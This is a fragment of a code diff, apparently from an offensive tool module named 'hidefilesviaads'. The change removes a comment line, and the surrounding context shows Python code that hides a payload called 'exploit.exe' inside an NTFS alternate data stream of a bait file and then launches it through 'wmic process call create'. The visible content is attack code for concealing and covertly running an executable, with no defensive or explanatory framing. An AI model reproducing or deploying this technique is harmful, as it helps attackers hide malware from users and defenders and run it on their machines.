@@ -19,4 +19,3 @@ with open(command, "r") as c:
 payload = "exploit.exe"
 payload_path = os.path.join(os.getcwd(), createADS(bait, payload))
 os.system("wmic process call create " + payload_path)
-# Clarify implementation notes for hidefilesviaads module
